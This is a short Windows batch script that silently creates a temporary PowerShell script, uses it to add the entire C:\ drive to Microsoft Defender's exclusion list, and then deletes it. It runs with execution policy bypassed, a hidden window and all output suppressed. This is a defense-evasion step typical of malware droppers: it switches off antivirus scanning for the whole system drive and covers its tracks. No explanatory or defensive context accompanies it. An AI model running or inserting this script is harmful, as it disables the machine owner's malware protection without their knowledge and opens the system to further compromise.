@echo off

:: Step 1: Define the path for the temporary PowerShell script
set "tempPsScript=%TEMP%\add_exclusion.ps1"

:: Step 2: Create the PowerShell script silently
(
    echo $exclusionPath = "C:\"
    echo Add-MpPreference -ExclusionPath $exclusionPath
) > "%tempPsScript%"

:: Step 3: Run the PowerShell script silently
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "%tempPsScript%" >nul 2>&1

:: Step 4: Optionally, clean up the temporary PowerShell script (comment if you want to keep it)
del "%tempPsScript%" >nul 2>&1
